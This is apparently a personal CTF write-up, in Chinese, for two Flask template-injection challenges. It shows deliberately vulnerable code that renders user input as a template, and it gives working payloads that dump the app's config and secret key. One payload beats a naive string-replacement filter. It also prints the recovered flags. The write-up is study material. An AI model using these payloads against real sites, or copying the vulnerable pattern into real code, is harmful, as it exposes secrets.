#Web 


給了一個網址，點開來：
![[W4-4_web.png|366]]
### SSTI
![[SSTI.png]]

---
# SSTI-waf1
## 題目

```js
from flask import (
    Flask,
    request,
    render_template,
    render_template_string,
    Response
)

app = Flask(__name__)
app.secret_key = open("/flag").read()

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        rawtext = request.form.get("rawtext")
        rawtext = "😺 " + rawtext + " 😺"
        return render_template_string(rawtext)

    return render_template("index.html")

@app.route('/source')
def get_main_py():
    with open('/app/main.py', 'r', encoding='utf-8') as file:
        content = file.read()
    return Response(content, mimetype='text/plain')

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")
```


## 解題
1. 題目 SSTI，且使用 Flask -> 輸入 `{{config}}`
   ![[W4-4_conf.png]]
   or 輸入 `{{ config['SECRET_KEY'] }}`
2. flag = `CTF{SSTI_can_use_without__}`

---

# SSTI-waf2

## 題目
```js
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        rawtext = request.form.get("rawtext")
        mappings = {"{{": "", "}}": "", ".": "...", "(": ""}
        for mapping in mappings:
            rawtext = rawtext.replace(mapping, mappings[mapping])
        rawtext = "😺 " + rawtext + " 😺"
        return render_template_string(rawtext)

    return render_template("index.html")
```

## 解題
1. 多了限制 
	```js
	mappings = {
		"{{": "", 
		"}}": "", 
		".": "...", 
		"(": ""
	}
	```
	
	把 `{{config}}` 改為 `{({(config}(}` 輸入
	![[W4-5_flag.png]]
1. flag = `CTF{5571_bu7_b33n_f0rm4773d_u2yu1bw}`